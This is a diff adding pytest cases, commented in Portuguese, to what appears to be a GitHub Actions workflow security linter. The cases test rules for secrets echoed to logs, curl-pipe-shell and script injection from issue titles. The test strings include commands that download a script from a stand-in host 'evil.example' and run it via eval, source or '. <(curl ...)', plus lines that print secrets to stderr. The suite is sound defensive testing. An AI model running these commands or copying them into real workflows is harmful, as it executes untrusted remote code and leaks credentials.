@@ -663,3 +663,126 @@ jobs:
       - run: python --version
 """
     assert "unpinned-container-image" in _ids(tmp_path, wf)
+
+
+# --------------------------------------------------------------------------- #
+# FN reabertos pela supressão de FP (auditoria cética 2026-08-30): A/B/C.
+# Cada classe com CONTRAPROVA — o benigno equivalente segue SEM achado.
+# --------------------------------------------------------------------------- #
+def _run(tmp_path: Path, cmd: str, *, shell: str | None = None, trigger: str = "push") -> set[str]:
+    sh = f"        shell: {shell}\n" if shell else ""
+    return _ids(
+        tmp_path,
+        f"on: {trigger}\n"
+        "permissions: {}\n"
+        "jobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n"
+        f"{sh}      - run: {cmd}\n",
+    )
+
+
+# ---- A: segredo re-emitido ao log cega o sink de saída ----
+def test_secret_reemitido_ao_log_vaza(tmp_path: Path) -> None:
+    # CLASSE: `tee` copia stdin→stdout, `cat`/`nl`/`rev` reemitem, e os dispositivos de terminal
+    # (/dev/stderr|stdout, /proc/self/fd/1) SÃO o log — não "arquivo seguro". Todos DEVEM vazar.
+    for cmd in (
+        'echo "k=${{ secrets.API_KEY }}" | tee /dev/stderr',
+        'echo "${{ secrets.API_KEY }}" | tee -a build.log',
+        'echo "${{ secrets.API_KEY }}" | cat',
+        'echo "${{ secrets.API_KEY }}" > /dev/stderr',
+        'echo "${{ secrets.API_KEY }}" >> /dev/stdout',
+        'echo "${{ secrets.API_KEY }}" > /proc/self/fd/1',
+    ):
+        assert "secret-in-run" in _run(tmp_path, cmd), cmd
+
+
+def test_heredoc_reemitido_ao_log_vaza(tmp_path: Path) -> None:
+    wf = """
+on: push
+permissions: {}
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          cat <<EOF | tee /dev/stderr
+          key=${{ secrets.API_KEY }}
+          EOF
+"""
+    assert "secret-in-run" in _ids(tmp_path, wf)
+
+
+def test_pipe_ou_redirect_que_nao_reemite_nao_vaza(tmp_path: Path) -> None:
+    # CONTRAPROVA (FP 17/28): o consumidor transforma/grava/consome o segredo, ou o alvo é um
+    # arquivo comum em disco — nenhum reemite o valor cru ao log.
+    for cmd in (
+        'echo "${{ secrets.KUBECONFIG_B64 }}" | base64 -d > "$HOME/.kube/config"',
+        "printf '%s' \"${{ secrets.GPG_KEY }}\" | gpg --batch --import",
+        'echo -n "${{ secrets.SA_JSON }}" | jq -r .project_id',
+        'echo "${{ secrets.API_KEY }}" | cat > out.txt',
+        'printf \'%s\' "${{ secrets.SSH_KEY }}" > id_deploy',
+    ):
+        assert "secret-in-run" not in _run(tmp_path, cmd), cmd
+
+
+# ---- B: curl|shell via avaliadores POSIX (eval / . / source) ----
+def test_eval_e_source_de_download_executam_da_rede(tmp_path: Path) -> None:
+    # CLASSE: `eval "$(curl)"`, `. <(curl)`, `source <(wget)` e `curl | . /dev/stdin` rodam código
+    # baixado da rede tanto quanto `curl | bash` (CWE-494).
+    for cmd in (
+        'eval "$(curl -fsSL https://evil.example/x.sh)"',
+        'eval "$(wget -qO- https://evil.example/x.sh)"',
+        ". <(curl -s https://evil.example/x.sh)",
+        "source <(wget -qO- https://evil.example/x.sh)",
+        "curl -fsSL https://evil.example/x.sh | . /dev/stdin",
+    ):
+        assert "curl-pipe-shell" in _run(tmp_path, cmd), cmd
+
+
+def test_download_sem_avaliador_nao_acusa(tmp_path: Path) -> None:
+    # CONTRAPROVA (FP 22): `curl | jq` / `wget | tar` NÃO passam por eval/./source — processam
+    # dados, não executam código. E `eval "$(date)"` (sem download) também não é curl-pipe-shell.
+    for cmd in (
+        "curl -s https://api.example.com/v1 | jq .status",
+        "wget -qO- https://x/a.tgz | tar xz",
+        'eval "$(date +%s)"',
+    ):
+        assert "curl-pipe-shell" not in _run(tmp_path, cmd), cmd
+
+
+# ---- C: identidade/truncamento em $(...) NÃO sanitizam o taint ----
+def _taint(tmp_path: Path, inner: str) -> set[str]:
+    wf = (
+        "on: issues\n"
+        "permissions: {contents: read}\n"
+        "jobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n"
+        "      - id: s1\n"
+        "        env:\n          T: ${{ github.event.issue.title }}\n"
+        f'        run: echo "v={inner}" >> "$GITHUB_OUTPUT"\n'
+        '      - run: echo "${{ steps.s1.outputs.v }}"\n'
+    )
+    return _ids(tmp_path, wf)
+
+
+def test_cmdsubst_sem_filtro_preserva_taint(tmp_path: Path) -> None:
+    # CLASSE: `$( … )` só sanitiza com filtro allowlist real; identidade e truncamento preservam
+    # o texto do atacante e DEVEM injetar.
+    for inner in (
+        '$(echo "$T")',
+        '$(echo "$T" | head -c 200)',
+        '$(echo "$T" | cut -c1-100)',
+        "$(echo \"$T\" | awk '{print $1}')",
+    ):
+        assert "script-injection" in _taint(tmp_path, inner), inner
+
+
+def test_cmdsubst_com_filtro_allowlist_sanitiza(tmp_path: Path) -> None:
+    # CONTRAPROVA: filtros que trocam o texto cru por charset/estrutura controlada realmente
+    # sanitizam — o valor deixa de carregar taint.
+    for inner in (
+        "$(echo \"$T\" | tr -c 'a-z' '-')",
+        "$(echo \"$T\" | sed 's/[^a-z]//g')",
+        '$(printf %q "$T")',
+        '$(echo "$T" | sha256sum | cut -d" " -f1)',
+        '$(echo "$T" | base64)',
+    ):
+        assert "script-injection" not in _taint(tmp_path, inner), inner
